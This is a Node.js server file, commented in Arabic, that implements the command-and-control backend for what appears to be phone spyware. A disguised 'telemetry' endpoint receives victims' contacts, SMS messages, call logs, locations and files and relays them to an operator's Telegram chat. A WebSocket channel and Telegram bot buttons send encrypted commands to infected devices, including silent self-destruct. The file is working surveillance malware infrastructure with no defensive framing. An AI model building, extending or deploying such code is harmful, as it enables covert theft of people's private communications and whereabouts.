// server.js - إطار الإدارة والتحكم الشبح المتكامل صفر الأثر (2026)
require('dotenv').config();
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const uuid4 = require('uuid');
const multer = require('multer');

const token = process.env.TG_TOKEN;
const id = process.env.TG_ID;
const AGENT_SECRET = process.env.AGENT_SECRET || 'ZeroDaySecureEncryptionKey2026';

if (!token || !id) { console.error('Missing tokens'); process.exit(1); }

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();

app.use(express.text({ type: '*/*', limit: '100mb' }));

// اشتقاق مفتاح التشفير العسكري داخلياً بالذاكرة
const CRYPTO_KEY = crypto.scryptSync(AGENT_SECRET, 'stealth_salt', 32);

// --- موديول التعمية والتشفير المتقدم (AES-256-GCM) ---
function encrypt(plainText) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', CRYPTO_KEY, iv);
    let encrypted = cipher.update(plainText, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    return Buffer.from(JSON.stringify({ v: iv.toString('hex'), g: authTag, d: encrypted })).toString('base64');
}

function decrypt(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, Buffer.from(packet.v, 'hex'));
        decipher.setAuthTag(Buffer.from(packet.g, 'hex'));
        let decrypted = decipher.update(packet.d, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) { return null; }
}

// --- مسارات الويب المموهة لجمع البيانات (Stealth Endpoints) ---
app.post('/assets/v1/sync-telemetry', upload.single('file'), async (req, res) => {
    try {
        const xMode = req.headers['x-sync-mode']; 
        const agentId = req.headers['x-agent-id'] || '?';
        const model = req.headers['x-agent-model'] || '?';

        // 1. استقبال الملفات المشفّرة
        if (xMode === 'file' && req.file) {
            const ext = req.file.originalname.split('.').pop().toLowerCase();
            const caption = `°• ملف من الشبح: <b>${model}</b>\n📄 ${req.file.originalname}`;
            if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
                await appBot.sendPhoto(id, req.file.buffer, { caption, parse_mode: 'HTML' });
            } else {
                await appBot.sendDocument(id, req.file.buffer, { caption, parse_mode: 'HTML' }, { filename: req.file.originalname });
            }
            return res.send('');
        }

        // 2. استقبال النصوص والبيانات الحيوية ومفكوكها في الذاكرة
        const decryptedRaw = decrypt(req.body);
        if (!decryptedRaw) return res.sendStatus(404);
        const payload = JSON.parse(decryptedRaw);

        if (xMode === 'contacts') {
            let text = '';
            payload.forEach((c, i) => { text += `${i + 1}. ${c.name || '?'}\n   📞 ${c.phone || '?'}\n`; });
            await sendLongText(`👥 جهات الاتصال (${payload.length})`, agentId, text);
        } 
        else if (xMode === 'messages') {
            let text = '';
            payload.forEach((m, i) => { text += `${i + 1}. من: ${m.from || '?'}\n   ${m.body || ''}\n\n`; });
            await sendLongText(`💬 الرسائل (${payload.length})`, agentId, text);
        }
        else if (xMode === 'calls') {
            let text = '';
            payload.forEach((c, i) => { text += `${i + 1}. ${c.type || '?'} — ${c.number || '?'}\n   ⏱️ ${c.duration || 0} ثانية\n\n`; });
            await sendLongText(`📞 سجل المكالمات (${payload.length})`, agentId, text);
        }
        else if (xMode === 'location') {
            await appBot.sendLocation(id, payload.lat, payload.lon);
        }
    } catch (err) {}
    res.send('');
});

// --- قناة النفق الفوري (WebSocket Server) ---
appSocket.on('connection', (ws, req) => {
    const authKey = req.headers['x-agent-key'];
    if (authKey !== AGENT_SECRET) return ws.close(1008, 'Unauthorized');

    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    ws.uuid = uuid;
    appClients.set(uuid, { socket: ws, model });

    appBot.sendMessage(id, `🟢 <b>شبح جديد متصل بالشبكة المعماة</b>\n📱 الجهاز: <b>${model}</b>\n🆔 ID: <code>${uuid}</code>`, { parse_mode: 'HTML' });

    ws.on('message', (msg) => {
        const decrypted = decrypt(msg.toString());
        if (decrypted) {
            const data = JSON.parse(decrypted);
            appBot.sendMessage(id, `📥 استجابة من [${model}]:\n<pre>${JSON.stringify(data, null, 2)}</pre>`, { parse_mode: 'HTML' });
        }
    });

    ws.on('close', () => { appClients.delete(uuid); });
});

// --- لوحة تحكم البوت الذكية التفاعلية (Telegram Bot Control) ---
appBot.on('message', async (msg) => {
    const text = msg.text;
    if (text === '📱 الاجهزة المتصلة') {
        let reply = '<b>👥 الأشباح النشطة حالياً:</b>\n\n';
        appClients.forEach((client, uuid) => {
            reply += `• 📱 ${client.model}\n🆔 <code>${uuid}</code>\n/cmd_${uuid}\n\n`;
        });
        appBot.sendMessage(id, reply, { parse_mode: 'HTML' });
    }
});

// التعامل مع أوامر السيطرة المباشرة من البوت
appBot.onText(/\/cmd_(.+)/, (msg, match) => {
    const uuid = match[1];
    if (!appClients.has(uuid)) return appBot.sendMessage(id, '❌ الجهاز غير متصل.');

    const client = appClients.get(uuid);
    // إرسال لوحة خيارات مشفرة مخصصة للجهاز المحدد عبر تليجرام
    appBot.sendMessage(id, `🎯 التحكم بالشبح: <b>${client.model}</b>`, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: '👥 جلب جهات الاتصال', callback_data: `contacts:${uuid}` }],
                [{ text: '💬 جلب الرسائل SMS', callback_data: `messages:${uuid}` }],
                [{ text: '🔥 تدمير ذاتي صامت', callback_data: `burn:${uuid}` }]
            ]
        }
    });
});

appBot.on('callback_query', (query) => {
    const [action, uuid] = query.data.split(':');
    if (!appClients.has(uuid)) return appBot.answerCallbackQuery(query.id, { text: 'الجهاز انقطع اتصاله.' });

    const client = appClients.get(uuid);
    // تشفير الأمر بالكامل قبل إرساله في نفق الـ WebSocket
    const payload = encrypt(JSON.stringify({ action: action }));
    client.socket.send(payload);

    appBot.answerCallbackQuery(query.id, { text: 'تم تشفير وتمرير الأمر بنجاح!' });
});

async function sendLongText(title, agentId, text) {
    const MAX = 3500;
    const chunks = [];
    for (let i = 0; i < text.length; i += MAX) chunks.push(text.substring(i, i + MAX));
    for (let i = 0; i < chunks.length; i++) {
        await appBot.sendMessage(id, `<b>${title} [${i+1}/${chunks.length}]</b>\n<pre>${escapeHtml(chunks[i])}</pre>`, { parse_mode: 'HTML' });
    }
}
function escapeHtml(str) { return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

appServer.listen(PORT);
